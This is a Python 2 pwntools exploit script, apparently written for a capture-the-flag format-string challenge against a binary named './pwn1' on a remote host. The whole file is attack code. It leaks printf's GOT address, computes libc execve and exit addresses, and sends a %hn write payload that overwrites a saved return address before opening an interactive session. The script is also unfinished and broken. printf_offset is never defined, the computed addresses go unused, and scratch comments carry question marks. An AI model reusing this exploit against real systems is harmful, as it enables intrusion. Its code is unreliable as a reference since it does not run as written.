from pwn import *
import time

debug = 1
local = 0
attach = local & 1
bps = attach & 1
proc_name = './pwn1'
#socat TCP4-LISTEN:10001,fork EXEC:./pwn3
ip = '10.105.42.5 '
port = 2333
io = None

def makeio():
    global io 
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
def ru(data):
	return io.recvuntil(data)
def rv():
	return io.recv()
def sl(data):
	return io.sendline(data)
def rl():
	return io.recvline()

def exec_fmt(payload):  
    if local:
    	io = process(proc_name)
    else:
    	io = remote(ip,port)
    io.recvuntil('Welcome~\n')
    io.sendline(payload)
    info = io.recv()
    io.close()
    return info

def pwn():
	makeio()
	if debug:
		context.log_level = 'debug'
	if attach:
		if bps:
			gdb.attach(pidof(proc_name)[0], open('bps'))
		else:
			gdb.attach(pidof(proc_name)[0])
	# autofmt = FmtStr(exec_fmt)  
	# print autofmt.offset





	libc=ELF('./libc-32.so')  #-------?
	printf_got= 0x804a004 # libc.symbols['printf']  #---------?
	print "printf_got %#x" %  printf_got

	ru('Welcome~\n')
	payload = p32(printf_got) + "%%%d$s"  % 7 #autofmt.offset  
	
	io.sendline(payload)
	
	data = io.recvline()
	# print "data%#x" % data

	printf_addr = u32(data[4:8])
	print "%#x" % printf_addr
	
	execve_offset = libc.symbols['execve']

	execve_addr = printf_addr -  printf_offset +  execve_offset


	exit_offset = libc.symbols['exit']
	
	exit_got = 0x804a024

	sh = '\x73\x68\x00' # ? fanguolai?

	# rukoudizhi 080485DD push ebp
	# fanhuidizhi 
	# ebp 0xffffcfc8
	#
	# * 0xffffcfcc ->  0x080485DD

	raw_ret = 0xffffcfcc
	entrypoint = 0x080485DD
	entrypoint_l = entrypoint & 0xffff;entrypoint_h = entrypoint >>16
	offset = 7
	payload = "%" + str(entrypoint_h) + "c%15$hn%" + str( entrypoint_l -entrypoint_h) + "c%14$hnAA"
	payload = payload.ljust(28,'A')
	payload +=  p32(raw_ret)  + p32(raw_ret+0x2)
	sl(payload)

	rv()
	io.interactive()









	# print printf_offset,' ',execve_offset
	# rv()
	# io.interactive()

if __name__ == '__main__':
	pwn()